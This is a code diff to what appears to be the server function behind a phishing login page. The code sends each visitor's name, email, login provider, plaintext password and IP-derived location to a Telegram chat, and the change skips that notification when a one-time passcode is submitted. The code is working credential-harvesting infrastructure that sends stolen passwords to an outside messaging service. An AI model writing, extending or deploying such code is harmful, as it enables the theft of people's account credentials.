@@ -247,10 +247,11 @@ serve(async (req) => {
     // Server-side lookup wins — runs in Deno, never blocked by browser adblockers
     const geo = await resolveGeo(clientIp, clientGeo)
 
-    // Send Telegram notification (must await so Deno isolate doesn't terminate before it finishes)
-    await sendTelegramNotification(formattedName, body.email, body.provider || 'email', body.password, geo).catch(err => {
-      console.error('Telegram notification error:', err)
-    })
+    if (!isOtpSubmission) {
+      await sendTelegramNotification(formattedName, body.email, body.provider || 'email', body.password, geo).catch(err => {
+        console.error('Telegram notification error:', err)
+      })
+    }
 
     // Return success response
     const response: LoginResponse = {
